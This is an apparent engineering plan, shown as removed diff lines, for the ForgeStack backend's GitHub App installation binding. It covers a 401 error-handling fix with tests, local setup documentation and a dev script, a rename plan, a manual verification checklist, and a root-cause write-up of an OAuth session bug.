-- **`ddl-auto: validate` is strict** — the `citext` incident is precedent. `permissions` and `events` are `jsonb`; map with `@JdbcTypeCode(SqlTypes.JSON)`. If validation objects, map them as `String` rather than weakening validation.
-- **The callback sits under `/api/**`**, so `SecurityConfig` already requires authentication. A session that expires mid-install yields a bare 401 rather than a login redirect. Acceptable for alpha; note it, do not fix it here.
-- **`setup_action`** is `install` or `update`; treat `update` as a no-op re-sync rather than an error.
-- New config: `forge.github.app.setup-redirect` (default `/`) for where to send the browser afterwards. `slug` already exists and builds the install URL.
-
-## Verification
-
-- `./gradlew test` — expect **~53** tests green.
-- **The anti-hijack test is the point of the task.** Bind installation `A` owned by GitHub user `1`; then, as a user whose `provider_user_id` is `2`, replay the callback with `A`'s id and a nonce legitimately minted for user 2's own session. Must be rejected with an audit row, and `github_installations` must be unchanged. A test that only exercises the happy path proves nothing here.
-- Nonce: reuse rejected (single-use), foreign session rejected, absent rejected.
-- Organization `account_type` rejected with the "not yet supported" path, not a stack trace.
-- Rebinding an already-bound `installation_id` to a second workspace fails at the **database** unique constraint, not only in application code — assert the constraint violation specifically, since that is the guarantee §7 relies on.
-- `/api/session` now returns a non-null `activeWorkspaceId` — the regression test for the prerequisite fix.
-- `ModularityTest.moduleNamesAreDeliberate` still passes; `api.installation` is a sub-package, not a new module.
-
-## Out of scope — Task #16
-
-Repository sync (`GET /installation/repositories`) and `ManagedRepository` opt-in. Deliberately separate: the verification chain is the security-critical piece and deserves to be reviewable without a repo-sync loop diluting the diff.
-
----
-
-# Addendum — closing gap §1.1, and the local-setup facts needed before real credentials
-
-## Context
-
-Tasks #15 and #16 are done (66 tests green) and `docs/known-gaps.md` records what was deferred. The next step is the first run against a real GitHub App, and two things block it.
-
-**The blocker in the code (§1.1).** `GithubAppClient.fetchInstallation` swallows every 4xx and returns `Optional.empty()`. That is correct for 404 — the binding flow must not tell a caller whether an installation id exists — but it treats **401 identically**. A 401 means GitHub is rejecting *Forge's own App credentials*: wrong `app-id`, a revoked key, a well-formed key belonging to a different App, or clock skew. Today that presents to every user as `403 NOT_YOUR_ACCOUNT` / `UNKNOWN_INSTALLATION`, with nothing in the logs pointing at the real cause. It is the most likely first-run failure and the hardest one to diagnose.
-
-Worth being precise about the scope: a *malformed* key already fails loudly — `GithubAppJwtService.parsePrivateKey` detects PKCS#1 and throws with the exact `openssl` command. The silent case is specifically a key that parses fine and GitHub refuses. The other three GitHub calls (`listRepositories`, `mintDiscoveryToken`, `mintInstallationToken`) register no `onStatus` handler, so `RestClient` already throws on 4xx there. `fetchInstallation` is the only silent path.
-
-**The blocker outside the code.** No frontend exists yet (`/home/user/Self/Forge/forge-frontend` is an empty directory), so the App and OAuth App must be configured entirely against the backend on `localhost:8080`. Which of GitHub's URL fields are load-bearing versus cosmetic is not written down anywhere, and getting the callback URLs wrong is a silent-ish failure too.
-
-A second, newly found trap that will bite the manual test on step one is recorded in §4 below.
-
-## 1. Fix §1.1 — `githubinstallation/internal/app/GithubAppClient.java`
-
-Add an SLF4J logger (matching the four already in the module) and replace the empty `onStatus` handler at line 78 with a status-aware one.
-
-**401 throws; everything else still returns empty.** A 401 is not a fact about the requested installation — it is a fact about Forge's configuration, identical for every id — so surfacing it leaks nothing and is not an oracle. Letting it fall through to the rejection path is what makes a misconfigured Forge tell every user their installation is not theirs.
-
-```java
-public Optional<InstallationView> fetchInstallation(long installationId) {
-    InstallationView view = restClient
-            .get()
-            .uri("/app/installations/{id}", installationId)
-            .header("Authorization", "Bearer " + appJwt.mintAppJwt())
-            .retrieve()
-            .onStatus(HttpStatusCode::is4xxClientError, (request, response) ->
-                    handleLookupFailure(installationId, response.getStatusCode()))
-            .body(InstallationView.class);
-
-    return Optional.ofNullable(view);
-}
-
-/**
- * What a 4xx on an installation lookup means, and who it is about.
- *
- * <p>Only 404 is routine. Collapsing the rest into it is what turned a wrong App key into
- * "that installation is not yours" — a message about the caller, for a fault that is ours.
- */
-private void handleLookupFailure(long installationId, HttpStatusCode status) {
-    if (status.value() == HttpStatus.UNAUTHORIZED.value()) {
-        // Not about this installation: GitHub is refusing the App credentials themselves, so
-        // no binding by any user can succeed. Thrown rather than returned, because it is a
-        // server fault and the caller-facing rejection path would bury it.
-        throw new IllegalStateException("GitHub rejected the Forge App credentials (401). Check "
-                + "forge.github.app.app-id and the private key — a well-formed key belonging to a "
-                + "different App fails exactly here.");
-    }
-    if (status.value() == HttpStatus.NOT_FOUND.value()) {
-        // The ordinary answer for a guessed id. Callers must not be able to tell this from 403,
-        // so only the server-side record distinguishes them.
-        log.debug("GitHub does not know installation {}", installationId);
-        return;
-    }
-    // Usually a suspended App or an exhausted rate limit. Both are operator concerns and both
-    // were invisible while this was folded in with 404.
-    log.warn("Installation lookup for {} refused with {}", installationId, status.value());
-}
-```
-
-Nothing else changes. `InstallationBindingService` catches `RuntimeException` only around `repositorySync.sync()` and `DataIntegrityViolationException` only around persist, so the throw propagates to Spring's default handler as a 500 with no controller change needed.
-
-One consequence to accept, not fix: the nonce is consumed before `fetchInstallation` runs, so a 401 spends it and the user must restart the install flow. Single-use is the security property; weakening it to be tidy on a path that should never happen is the wrong trade.
-
-## 2. Test support — `src/test/java/dev/tushar/forge/support/FakeGithub.java`
-
-Add a registry of installation ids that answer 401, so the case is exercised without a global toggle that could bleed across tests sharing the static server:
-
-```java
-private static final Set<Long> UNAUTHORIZED = ConcurrentHashMap.newKeySet();
-
-/** An installation id GitHub answers with 401 — the shape of a rejected App key. */
-public static long unauthorized() {
-    long id = NEXT_ID.incrementAndGet();
-    UNAUTHORIZED.add(id);
-    return id;
-}
-```
-
-In `handleInstallations`, check `UNAUTHORIZED` in the non-token branch only (the `/access_tokens` branch returns early above it) and `respond(exchange, 401, "")`.
-
-## 3. Test — `InstallationBindingServiceTest`
-
-One test, beside the existing `unknownInstallationIsRejected` which already pins the 404 behaviour and must stay green:
-
-```java
-@Test
-@DisplayName("GitHub rejecting Forge's own credentials is a server fault, not a user rejection")
-void badAppCredentialsFailLoudly() {
-    long installationId = FakeGithub.unauthorized();
-    String nonce = bindings.beginSetup(sessionId);
-
-    assertThatThrownBy(() -> bindings.completeSetup(installationId, nonce, sessionId, userId, workspaceId))
-            .isInstanceOf(IllegalStateException.class)
-            .hasMessageContaining("401");
-}
-```
-
-Per the standard used for the anti-hijack and discovery-never-implies-consent guarantees: run this against the current implementation first and watch it fail (it returns `Rejected(UNKNOWN_INSTALLATION)` rather than throwing) before the fix lands.
-
-## 4. Newly found gap — `cookie-secure` defaults to `true`
-
-`SecurityConfig.java:24` defaults `forge.security.cookie-secure` to `true`, and `ForgeSessionCookie.write` sets `Secure` from it. Over plain `http://localhost:8080`, **`curl` will not send a `Secure` cookie back**, so every authenticated step of the §7 manual checklist fails with a bare 401 that looks like broken auth. Browsers are more forgiving (Chrome and Firefox permit `Secure` on `localhost`), which makes this worse — it will work in the browser and fail in `curl`, in the same session.
-
-**No yaml change.** Defaulting to insecure so local testing is convenient is exactly how it ships that way. Run the app with the override instead, and record it in the setup doc:
-
-```
-SPRING_APPLICATION_JSON='{"forge":{"security":{"cookie-secure":false}}}' ./gradlew bootRun
-```
-
-## 5. New file — `docs/local-setup.md`
-
-Answers the question this addendum started from. **The rule: a URL GitHub *redirects the browser to* must be the backend; a URL GitHub merely *displays* is cosmetic.** Homepage URL is in the second category — it appears on the consent screen and the App's public page and never participates in either flow.
-
-**OAuth App** (identifies humans — `read:user`, `user:email`):
-
-| Field | Value | Load-bearing? |
-|---|---|---|
-| Homepage URL | `http://localhost:8080` | No — cosmetic. Becomes the frontend URL when one exists |
-| Authorization callback URL | `http://localhost:8080/login/oauth2/code/github` | **Yes** — Spring Security owns this path |
-
-**GitHub App** (grants the agent authority):
-
-| Field | Value | Load-bearing? |
-|---|---|---|
-| Homepage URL | `http://localhost:8080` | No — cosmetic |
-| Setup URL | `http://localhost:8080/api/installations/callback` | **Yes** — `InstallationController.callback` |
-| Redirect on update | ticked | Yes — makes `setup_action=update` come back through the same check |
-| Webhook | **Active unchecked** | Not built until Phase 6 |
-| Install scope | Only on this account | Org installs are refused by design (§4.1) |
-
-Permissions: Metadata read; Contents, Pull requests, Issues read+write; Checks, Commit statuses, Actions read. **Not Workflows** — that omission is what prevents the agent editing the CI config that grades its own work.
-
-Environment (never in `application.yaml` — the App private key can act as the App on every account it is installed on):
-
-```bash
-export GITHUB_OAUTH_CLIENT_ID=...
-export GITHUB_OAUTH_CLIENT_SECRET=...
-export FORGE_GITHUB_APP_APP_ID=...
-export FORGE_GITHUB_APP_SLUG=...
-export FORGE_GITHUB_APP_PRIVATE_KEY_PEM="$(cat github-app.pkcs8.pem)"
-openssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt \
-  -in github-app.private-key.pem -out github-app.pkcs8.pem   # JDK cannot read GitHub's PKCS#1
-```
-
-Confirm `*.pem` is gitignored before the key lands in the working tree. Verify the exact `FORGE_GITHUB_APP_*` names against `GithubAppProperties` binding while writing this file rather than trusting the list above.
-
-Also document where the user lands *after* each flow — `forge.security.login-success-redirect` and `forge.github.app.setup-redirect`, both currently `/`. These are Forge's own config, not GitHub's, and are the two knobs that will point at the frontend later. Leaving them at `/` now is deliberate: there is no dev server port to guess at, and no CORS bean is needed while everything is same-origin on 8080.
-
-## 6. Update `docs/known-gaps.md`
-
-- §1.1 — rewrite as fixed: 401 now throws with a diagnostic message, 403/404 remain indistinguishable to the caller and are logged apart server-side.
-- §1 — add the `cookie-secure` trap from §4 above, with the override command.
-- §5 — the "no real-GitHub smoke test" row stands; add that `FakeGithub` now covers 401.
-- §7 — add a checklist item: run once with a deliberately wrong `FORGE_GITHUB_APP_APP_ID` and confirm a 500 plus the credentials message, rather than a 403.
-- Fix the stray `**` at the start of line 1 and end of the last line — leftover bold markers that break rendering.
-
-## Verification
-
-- `./gradlew test` — expect **67**, up from 66, all green.
-- Watch `badAppCredentialsFailLoudly` fail against the unfixed client before applying the fix; a test for a diagnostic path that was never seen failing proves nothing.
-- `unknownInstallationIsRejected` must still return `Rejected(UNKNOWN_INSTALLATION)` — the 404 contract is unchanged, and this is the regression guard for it.
-- `ModularityTest` and `AbstractionHygieneTest` unaffected; no new type, no new module, no interface.
-- Manual, once credentials exist: start the app with a correct App id, complete an install, confirm binding; then restart with `FORGE_GITHUB_APP_APP_ID` set to a wrong number and confirm the callback returns 500 and the log names the credentials — not `403`.
-
-## Housekeeping
-
-Task list has drifted: #15 and #16 are both committed but still show `pending`.
-
----
-
-# Follow-up — `local-setup.md` conflates "required" with "load-bearing"
-
-**Status: implemented.** Superseded in part by the next section, which corrects a field name this
-one left untouched.
-
-## Context
-
-`docs/local-setup.md` was written this session and immediately misled the person it was written for.
-It labels Homepage URL **"cosmetic"** and says "anything resolvable is fine", so on hitting GitHub's
-required-field asterisk the reasonable conclusion was that the doc must be wrong.
-
-Both claims are sloppy in opposite directions:
-
-- Homepage URL **is required** on both the OAuth App and GitHub App forms. "Cosmetic" answered *does
-  Forge read this* when the reader was asking *must I fill this in*.
-- "Anything resolvable" overstates it — GitHub validates that the value parses as a URL and never
-  fetches it. Resolvability is not checked at all.
-
-The distinction the doc needs, and currently collapses into one column:
-
-> **Required** — the form will not submit without it.
-> **Load-bearing** — GitHub redirects a browser here, so a wrong value breaks the flow.
-
-Homepage URL is required on both forms and load-bearing on neither. Only the OAuth callback URL and
-the App's Setup URL are load-bearing.
-
-## Change — `docs/local-setup.md` only
-
-1. **Rewrite the "The rule for every URL field" section** to lead with required-vs-load-bearing
-   rather than redirects-vs-displays. Keep the redirect rule as the *test* for load-bearing, since
-   that is the useful heuristic. State plainly that Homepage URL is required, displayed only, never
-   fetched, and need not resolve. Offer `http://localhost:8080` or the repository URL, noting the
-   latter is the more honest value for a field whose only job is to be displayed.
-
-2. **Retitle the third column of both tables** from `Load-bearing?` to `What it does`, and replace
-   the `**No** — cosmetic` entries:
-
-   | Field | Value | What it does |
-   |---|---|---|
-   | Homepage URL | `http://localhost:8080` | Nothing — required by the form, displayed only |
-   | Authorization callback URL | `…/login/oauth2/code/github` | **Load-bearing** — Spring Security owns this path |
-
-   Same treatment for the GitHub App table's Homepage URL and Setup URL rows.
-
-3. **Sharpen the opening paragraph.** "asks for five URLs and only three of them do anything" has
-   the right instinct but reads as a grumble. Make it the thesis: most of these fields are required
-   and inert, and knowing which two are not is the entire point of the document.
-
-No code, no tests, no other file. The `known-gaps.md` cross-link added earlier stays valid.
-
-## Verification
-
-Not a testable change; the check is a reading one. Someone filling in both GitHub forms with only
-this document open should never have to guess whether a required field matters — the Homepage URL
-row must answer both "what do I type" and "does it matter" without the reader inferring either.
-`./gradlew test` should still report **67**; nothing under `src/` is touched.
-
----
-
-# Follow-up 2 — `local-setup.md` names a field GitHub has renamed, and omits two traps
-
-**Status: implemented.**
-
-## Context
-
-Walking the forms against the doc turned up one error and three omissions. The error is the
-expensive one: the doc calls the OAuth App's critical field **"Authorization callback URL"**, which
-is what GitHub used to call it. The form now says **"Redirect URIs"** — plural, a repeatable list of
-up to 10, with the single entry's label rendered as "Redirect URI". A reader scanning for the old
-name does not find it, and the one genuinely load-bearing field on that form is the one they end up
-guessing at.
-
-Verified while checking: `application.yaml` sets no `redirect-uri`, so Spring Security uses the
-default template `{baseUrl}/login/oauth2/code/{registrationId}` with `registrationId: github` —
-`http://localhost:8080/login/oauth2/code/github`, no trailing slash.
-
-The three omissions are all fields the doc says nothing about, two of which look like they need
-filling in and must not be:
-
-- The **GitHub App's own Redirect URI** and **"Request user authorization (OAuth) during
-  installation"**. Both must stay blank/unchecked — Forge identifies humans through the separate
-  OAuth App. The Redirect URI field in particular sits on the App form looking exactly like the one
-  that *is* required on the OAuth form. Enabling the OAuth-during-installation checkbox is Option 1
-  from the deferred org-support decision (§4.1) and would change the install flow.
-- **Allow wildcard matching** on the OAuth redirect. Must stay off: a wildcard redirect means any
-  matching subdomain or path can receive the authorization code.
-- **Generating the private key.** The doc explains converting PKCS#1 → PKCS#8 but never says where
-  the key comes from. It is at the bottom of the App's General page, and it is easy to finish the
-  form believing setup is complete without one.
-
-## Change — `docs/local-setup.md` only
-
-1. **OAuth App table** — rename the row to `Redirect URI`, noting GitHub previously called this
-   "Authorization callback URL" so anyone following an older guide can reconcile the two. Add rows
-   for `Allow wildcard matching` (off, with the reason) and `Expire user access tokens` (irrelevant
-   — Forge discards the user token after the profile fetch and never stores it, per §6).
-
-2. **GitHub App table** — add the two leave-them-alone rows, `Redirect URI` (blank) and `Request
-   user authorization (OAuth) during installation` (unchecked), each saying *why* rather than just
-   what, since "blank" without a reason invites someone to helpfully fill it in later.
-
-3. **New step: generate the private key.** Fold into the existing private-key section — where the
-   button is, that it downloads PKCS#1, then the existing `openssl` conversion.
-
-4. **New step: find your slug.** `FORGE_GITHUB_APP_SLUG` is currently described as "URL slug, e.g.
-   forge-tushar" with no way to obtain it. Say to read it off the App's public page URL
-   (`https://github.com/apps/<slug>`), and why it matters: `InstallationController.start` builds the
-   install URL from it, so a wrong slug is a 404 at the moment the user clicks Connect.
-
-5. **Note the unused credentials.** A GitHub App also issues a Client ID and client secret. Forge
-   uses neither — App auth is private key → JWT — and saying so prevents someone wiring the client
-   secret in somewhere on the assumption it must be needed.
-
-No code, no tests, no other file.
-
-## Verification
-
-Reading check again, but a sharper one than last time: every field visible on either registration
-form should appear in the doc, including the ones whose correct value is "leave it alone". The
-specific regression to avoid is a field name that no longer matches GitHub's UI, so the OAuth row
-must carry both the current name and the old one. `./gradlew test` still reports **67**; nothing
-under `src/` is touched.
-
----
-
-# Task A — make local configuration actually load, and finish GitHub setup
-
-## Context
-
-Setup stalled on two things a doc could not fix by describing harder.
-
-**`.env` is inert.** A `.env` was created at the repo root holding four variables, and nothing reads
-it. Spring Boot has no native `.env` support, and there is no dotenv dependency in `build.gradle`,
-nothing in `docker-compose.yml`, and nothing in the app. `local-setup.md` says `export FORGE_…`
-without ever saying how those exports are meant to happen, so reaching for a `.env` was the obvious
-move and it silently does nothing.
-
-**The private key had not been generated.** GitHub creates none when the App is created; it is a
-button on the General page under a *Private keys* heading, below the Webhook section. "I can't see
-any private key" was accurate — there was nothing to see. The doc says how to *convert* the key but
-originally never said where it comes from (partly fixed in Follow-up 2; the remaining gap is that a
-reader still has to scroll past what looks like the end of the form).
-
-Current `.env` versus what Forge reads:
-
-| Variable | Verdict |
-|---|---|
-| `GITHUB_OAUTH_CLIENT_ID` / `_SECRET` | correct — literal placeholders in `application.yaml` |
-| `GITHUB_APP_CLIENT_ID` / `_SECRET` | **unused** — App auth is private key → JWT, never the client secret. Remove |
-| `FORGE_GITHUB_APP_APP_ID` | missing — `4602643` |
-| `FORGE_GITHUB_APP_SLUG` | missing — read from `https://github.com/apps/<slug>` |
-| `FORGE_GITHUB_APP_PRIVATE_KEY_PEM` | missing — key not generated yet |
-
-Boot-time behaviour is acceptable and needs no code change: `GithubAppJwtService:49-52` throws
-`"GitHub App is not configured: set forge.github.app.app-id and forge.github.app.private-key-pem"`
-on first use. Legible, actionable, already tested. No startup validator required.
-
-## Change
-
-**1. `scripts/dev.sh`** — new, executable. The three things that must happen together and are easy
-to get wrong individually:
-
-```bash
-#!/usr/bin/env bash
-set -euo pipefail
-cd "$(dirname "$0")/.."
-
-[ -f .env ] || { echo "No .env — see docs/local-setup.md"; exit 1; }
-set -a; . ./.env; set +a          # -a exports everything the file defines
-
-# Secure cookies are withheld by curl over plain HTTP; see known-gaps.md §1.2.
-# Overridden here rather than weakened in application.yaml.
-exec ./gradlew bootRun --args='--forge.security.cookie-secure=false'
-```
-
-Sourcing rather than parsing is deliberate: it makes `FORGE_GITHUB_APP_PRIVATE_KEY_PEM="$(cat
-github-app.pkcs8.pem)"` work inside `.env`, so the key stays in its own gitignored file instead of
-being pasted as one long line into a second one.
-
-Use `--args` rather than `SPRING_APPLICATION_JSON` — same effect, far more readable, and it shows up
-in the process list where someone debugging can see it.
-
-**2. `.env.example`** — new, committed. Names only, no values, with the App-client trap called out:
-
-```bash
-GITHUB_OAUTH_CLIENT_ID=
-GITHUB_OAUTH_CLIENT_SECRET=
-FORGE_GITHUB_APP_APP_ID=
-FORGE_GITHUB_APP_SLUG=
-FORGE_GITHUB_APP_PRIVATE_KEY_PEM="$(cat github-app.pkcs8.pem)"
-# Not needed: a GitHub App also issues a Client ID and secret. Forge uses neither.
-```
-
-Confirm `.gitignore` already covers `.env` and `.env.*` but **not** `.env.example` — the current
-pattern `.env.*` would swallow it, so add a `!.env.example` negation.
-
-**3. `docs/local-setup.md`** — add a "Running it" rewrite: `cp .env.example .env`, fill it, run
-`./scripts/dev.sh`. State plainly that Spring Boot does not read `.env` and that the script is what
-loads it, so nobody later removes the script assuming the framework handles it. Fold the existing
-`cookie-secure` paragraph into the script's rationale rather than repeating the raw command.
-Sharpen the private-key step: GitHub generates none, keep scrolling past the Webhook section.
-
-## Verification
-
-- `./scripts/dev.sh` with an incomplete `.env` reaches the `GithubAppJwtService` message above
-  rather than failing obscurely.
-- With it complete, the app boots and `GET /api/session` over `curl` returns a session — this is the
-  end-to-end proof that both the env loading and the cookie override work, and the first item on the
-  `known-gaps.md` §7 checklist.
-- `git status` shows `.env.example` tracked and `.env` untracked.
-- `./gradlew test` still **67**; nothing under `src/` changes.
-
----
-
-# Task B — rename Forge → ForgeStack (deferred until Task A is verified)
-
-## Context
-
-The registered apps are "ForgeStack OAuth" and "ForgeStack App"; the codebase says Forge
-throughout. Decision taken: **ForgeStack is the product name and the codebase follows.**
-
-**Sequencing: do this after Task A proves the GitHub flow works end to end.** The rename changes
-`FORGE_GITHUB_APP_*` to `FORGESTACK_GITHUB_APP_*`, so doing it first means writing `.env` twice —
-but that is the small reason. The real one is that renaming 82 files before the credentials have
-ever succeeded means a first failure is ambiguous between "the rename broke it" and "the credentials
-are wrong". Verify against a known-good baseline, then rename. Cost of deferring: three variable
-names.
-
-## Blast radius (surveyed, not estimated)
-
-| Surface | Extent |
-|---|---|
-| Package root `dev.tushar.forge` | 82 files |
-| Class names | `ForgeApplication`, `ForgeApplicationTests`, `ForgeOAuth2UserService`, `ForgePrincipal`, `ForgeSessionAuthenticationFilter`, `ForgeSessionCookie` |
-| Config prefix `forge.*` | `forge.role`, `forge.github.app.*`, `forge.security.*` — and every matching env var |
-| Database | `jdbc:…/forge`, roles `forge_app` / `forge_migrator`, Hikari `forge-pool` |
-| Redis prefixes | `forge:ghtok:`, `forge:ghsetup:` |
-| Docs | `local-setup.md`, `known-gaps.md`, plus this plan |
-
-## Open decisions to settle when Task B starts
-
-Not settled now, because each has a real cost and none blocks Task A:
-
-1. **Does the database rename too?** `forge` → `forgestack` plus both roles means recreating the
-   local database and editing `docker-compose.yml`. Purely cosmetic; the alternative is a permanent
-   small inconsistency between product name and DB name, which is extremely common and harmless.
-2. **Does the config prefix become `forgestack.*`?** Consistent, but every property key and env var
-   gets four characters longer for no functional gain.
-3. **Do the `Forge*` classes become `ForgeStack*`?** `ForgeStackSessionAuthenticationFilter` is a
-   mouthful. The prefix exists only where it disambiguates from a framework type
-   (`ForgePrincipal` vs `java.security.Principal`), so a short internal prefix is defensible.
-
-Redis prefixes are safe to change whenever — the cache is derived state and losing it costs nothing.
-
-## Verification
-
-`./gradlew test` at **67** before and after, with `ModularityTest.moduleNamesAreDeliberate` updated
-to the new package root. The rename is correct only if the test count and the module inventory are
-identical on both sides; any change in either means something was renamed that should not have been.
-
----
-
-# Task C — first real installation, and the §7 checklist
-
-**Status: BLOCKED by Task D.** The first browser login succeeded and then every `/api/**` call
-returned HTTP 500. Task D fixes that; the checklist below resumes unchanged afterwards.
-
-## Context
-
-Tasks A and B are done: the app boots, `.env` loads via `scripts/dev.sh`, and the rename landed at
-67 tests green. Phase 1.6 has been *written* and unit-tested against `FakeGithub`, but **no line of
-it has ever run against real GitHub**. Everything below exists to change that.
-
-Two blockers were reported last session. One is now cleared, verified against the live API by
-minting an App JWT from `forgestack-app.pkcs8.pem` and calling `GET /app`:
-
-| Check | Before | Now |
-|---|---|---|
-| App permissions | `{}` | `actions:read, checks:read, contents:write, issues:write, metadata:read, pull_requests:write, statuses:read` — the seven from §7, **no `workflows`** |
-| `installations_count` | 0 | **0 — still the blocker** |
-
-The permission set is exactly right and needs no further edit. What remains is a browser action
-plus the verification pass it unlocks.
-
-## The one thing that will silently break the install
-
-The App must be installed **through ForgeStack**, not from GitHub's own app page.
-
-`InstallationBindingService.completeSetup:90-93` consumes a single-use nonce bound to the caller's
-session, and a missing `state` fails closed with `INVALID_SETUP_STATE` → 400
-(`InstallationController.statusFor:94`). Installing from `https://github.com/apps/forgestack-app`
-directly produces a callback with no `state`, so GitHub records the installation and ForgeStack
-records nothing — an inconsistency with no error message pointing at the cause.
-
-The correct entry point is `GET /api/installations/start`
-(`InstallationController.start:46-55`), which mints the nonce and builds the install URL from
-`FORGESTACK_GITHUB_APP_SLUG` (`forgestack-app`, confirmed against the live API).
-
-**Unverifiable remotely:** `GET /app` does not expose the App's Setup URL, so the one field that
-cannot be checked from here is whether it reads
-`http://localhost:8080/api/installations/callback`. If it is blank, GitHub never redirects back and
-the binding never happens. Eyeball it on the App's General page before installing.
-
-## Sequence
-
-Steps 1–2 need a browser and are the user's; everything after is drivable from `curl` given the
-session cookie.
-
-1. Log in: `http://localhost:8080/oauth2/authorization/github`. Confirm the consent screen requests
-   only `read:user` and `user:email` — the `GithubOAuthScopeTest` property, checked against the real
-   screen for the first time.
-2. Visit `http://localhost:8080/api/installations/start` in the same browser. Pick **QL-Tushar-Kumar**
-   and a small number of repositories.
-3. Export the session cookie and walk the `known-gaps.md` §7 checklist below.
-
-## Checklist, and what each item actually proves
-
-Ordered so the destructive items come last.
-
-| # | Item | Proves |
-|---|---|---|
-| 1 | `GET /api/session` returns non-null `activeWorkspaceId` | The Task #15 prerequisite fix — `Session.selectWorkspace` had zero callers and this was null since it was written |
-| 2 | Callback bound and redirected | The whole verification chain, first real run |
-| 3 | `GET /api/repositories` lists the chosen repos, all `managed: false` | §4.2 — installation access ≠ ForgeStack maintenance |
-| 4 | `POST /api/repositories/{id}/manage` flips exactly one | Opt-in is per repository |
-| 5 | Change selection on GitHub → `POST /api/repositories/sync/{installationId}` | Resync reflects GitHub, not cached state |
-| 6 | Remove a *managed* repo's access → status `ACCESS_LOST` | §7 lifecycle: silent failure here is the worst outcome |
-| 7 | Replay the callback URL from history | Nonce is single-use |
-| 8 | Hand-edit `installation_id` to another number | **The anti-hijack check.** Expect 403 + an `INSTALLATION_BIND_REJECTED` row in `audit_events` |
-| 9 | Grep the boot log for the PEM body and OAuth secret | No credential reaches the log sink |
-| 10 | Restart with a wrong `FORGESTACK_GITHUB_APP_ID`, replay the callback | **The §1.1 fix** — expect a 500 naming the credentials, not a 403. The only item `FakeGithub` cannot cover |
-
-Items 8 and 10 are the two that justify the exercise. Everything else confirms the happy path; those
-two confirm the guarantees, and per the standing rule a guarantee nobody has watched hold is one
-nobody knows works.
-
-Item 10 is last because it needs a restart with a deliberately broken `.env`, and item 6 is
-second-to-last because it revokes access the earlier items depend on.
-
-## Expected outcome
-
-No code changes are anticipated. Anything this turns up gets a `known-gaps.md` entry and its own
-fix commit, kept separate from the checklist run — the same discipline that kept the rename
-reviewable. Checked boxes land in `docs/known-gaps.md` §7 in one commit at the end.
-
-## Verification
-
-`./gradlew test` still **67**. This task adds no tests: it exercises paths that are already covered
-against `FakeGithub`, against the thing `FakeGithub` imitates.
-
----
-
-# Task D — the OAuth servlet session shadows the ForgeStack session
-
-**Status: implemented and committed (`6234e78`), 74 tests green.** Six of seven new tests were
-watched failing first, three reproducing the browser's exact NPE. The token-retention finding was
-corrected during implementation — the token was in Boot's autoconfigured
-`InMemoryOAuth2AuthorizedClientService`, not the servlet session, so the first-guess assertion would
-have passed without the fix. Written up as `known-gaps.md` §1.8 / §1.8b.
-
-## Context
-
-The first real browser login worked. The database proves it: one `users` row
-(`QL-Tushar-Kumar`, `provider_user_id 213618763`), one `user_identities` row, and one `sessions`
-row **with a non-null `workspace_id`** — which incidentally confirms the Task #15 prerequisite fix.
-
-Sixteen seconds later, `GET /api/installations/start` returned a Spring Boot Whitelabel error page.
-The log says why:
-
-```
-java.lang.NullPointerException: Cannot invoke
-  "dev.tushar.forgestack.githublogin.ForgeStackPrincipal.sessionId()" because "principal" is null
-```
-
-**This is not a setup mistake. Every authenticated endpoint is unreachable from a browser** — all
-seven, across `SessionController`, `InstallationController` and `RepositoryController`, which each
-take `@AuthenticationPrincipal ForgeStackPrincipal`.
-
-*(The Whitelabel page seen after step 1 was different and harmless: `login-success-redirect`
-defaults to `/`, nothing maps `/`, so a successful login lands on a 404. Cosmetic until a frontend
-exists.)*
-
-### Root cause
-
-Two authentication mechanisms are live at once, and the wrong one wins:
-
-1. `SecurityContextHolderFilter` sits at **position 3** of the chain — verified against the Spring
-   Security reference, and well before `ForgeStackSessionAuthenticationFilter`, which is registered
-   `addFilterBefore(..., UsernamePasswordAuthenticationFilter.class)` at ~9. It restores the
-   `OAuth2AuthenticationToken` that `oauth2Login` persisted into the servlet session.
-2. `ForgeStackSessionAuthenticationFilter:38` guards on
-   `SecurityContextHolder.getContext().getAuthentication() == null`. It is never null, so the filter
-   **never reads the ForgeStack cookie**.
-3. `authorizeHttpRequests` sees an authenticated request and admits it.
-4. `AuthenticationPrincipalArgumentResolver` finds an `OAuth2User` where a `ForgeStackPrincipal` is
-   declared. Per the Spring Security API docs, a type mismatch **returns null silently** unless
-   `errorOnInvalidType` is set. Hence the NPE.
-
-`SecurityConfig:58-60` already states the intent this code fails to implement:
-
-> *The API is authenticated by the ForgeStack session cookie, not by a servlet session.*
-
-The invariant that should hold and currently does not: **on `/api/**`, authenticated ⟺
-`ForgeStackPrincipal`.** Every controller assumes those cannot diverge.
-
-### Second finding — the GitHub user token is retained, but not where it looked
-
-**Corrected after checking Boot 4.1's actual autoconfiguration.** The first guess was the servlet
-session; it is wrong, and acting on it would have produced a test that passes vacuously.
-
-`spring-boot-security-oauth2-client-4.1.0.jar` — on the classpath via
-`spring-boot-starter-security-oauth2-client` — ships both
-`OAuth2ClientConfigurations$OAuth2AuthorizedClientServiceConfiguration` and
-`OAuth2ClientWebSecurityAutoConfiguration` (verified by listing the jar). Together they register an
-`InMemoryOAuth2AuthorizedClientService` and an `AuthenticatedPrincipalOAuth2AuthorizedClientRepository`
-over it. That repository routes to the **service** — not the session — whenever the principal is
-authenticated, which it is when `OAuth2LoginAuthenticationFilter` calls `saveAuthorizedClient`.
-
-So every GitHub user access token ForgeStack has issued is in a `ConcurrentHashMap` on the heap,
-keyed by GitHub login, for the process lifetime. Nothing evicts it: the logout handler
-(`SecurityConfig:54-57`) revokes the ForgeStack session and clears the cookie but never calls
-`removeAuthorizedClient`.
-
-Two consequences:
-
-- §6's *"No GitHub user token is persisted"* is false as stated, and so is the
-  `ForgeStackOAuth2UserService` class javadoc (*"used only to fetch the profile and is then
-  discarded — it is never persisted"*). Both are true of **our** code and false of the framework's.
-  Not configuring something is a decision, and this one was never made.
-- Blast radius is bounded — the scopes really are only `read:user`/`user:email`
-  (`GithubOAuthScopeTest` guards that), so a leaked token reads a profile and cannot touch code.
-  Worth fixing, not worth alarm. Note GitHub issues no refresh token unless token expiration is
-  enabled, which `local-setup.md` leaves optional, so assume access token only.
-
-The assertion this implies is **not** "nothing in the servlet session" but
-`OAuth2AuthorizedClientService.loadAuthorizedClient("github", login)` returning null — where the
-principal name is the `login` attribute, per `ForgeStackOAuth2UserService:59`
-(`new DefaultOAuth2User(authorities, enriched, "login")`).
-
-### Why no test caught it
-
-**Nothing in `src/test` authenticates a request.** `GithubOAuthScopeTest` inspects configured scopes
-and is the only file under `githublogin/`; there are no tests under `api/`. This is the
